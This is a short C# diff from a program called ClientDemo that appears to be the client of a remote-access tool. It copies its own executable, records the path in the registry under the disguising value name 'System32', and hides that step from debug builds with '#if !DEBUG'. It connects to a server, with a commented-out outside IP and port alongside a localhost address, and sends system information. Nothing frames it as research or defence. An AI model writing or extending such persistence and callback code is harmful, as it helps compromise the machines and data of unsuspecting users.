@@ -15,6 +15,7 @@ namespace ClientDemo
         public static HPClient client = new();
         static async Task Main(string[] args)
         {
+#if !DEBUG
             try
             {
                 string currentExePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
@@ -24,11 +25,13 @@ namespace ClientDemo
                 key.SetValue("System32", destinationPath);
                 key.Close();
 
-            }catch(Exception e)
+            }
+            catch (Exception e)
             {
                 Debug.WriteLine(e.Message);
             }
-            
+#endif
+            //await client.ConnectAsync("103.40.13.95", 33452);
             await client.ConnectAsync("127.0.0.1", 9000);
             var info = new ClientInfo().ToString();
 
